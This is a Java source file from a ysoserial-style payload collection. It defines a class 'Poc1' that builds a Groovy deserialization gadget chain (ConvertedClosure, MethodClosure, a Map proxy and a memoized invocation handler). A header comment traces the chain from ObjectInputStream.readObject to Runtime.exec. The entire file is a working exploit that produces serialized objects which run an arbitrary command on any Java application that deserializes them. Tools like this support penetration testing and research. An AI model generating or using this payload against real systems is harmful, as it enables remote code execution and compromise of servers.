package ysoserial.payloads.tabbyGadgetChains.groovy;
import java.lang.reflect.InvocationHandler;
import java.util.Map;

import org.codehaus.groovy.runtime.ConvertedClosure;
import org.codehaus.groovy.runtime.MethodClosure;

import ysoserial.payloads.ObjectPayload;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;

/**
 * ObjectInputStream.readObject()
 * PriorityQueue.readObject()
 * Comparator.compare() (Proxy)
 * ConvertedClosure.invoke()
 * MethodClosure.call()
 * ...
 * Method.invoke()
 * Runtime.exec()
 */


public class Poc1 extends PayloadRunner implements ObjectPayload<InvocationHandler> {

    public InvocationHandler getObject(final String command) throws Exception {
        final ConvertedClosure closure = new ConvertedClosure(new MethodClosure(command, "execute"), "entrySet");

        final Map map = Gadgets.createProxy(closure, Map.class);

        final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(map);

        return handler;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(Poc1.class, args);
    }
}
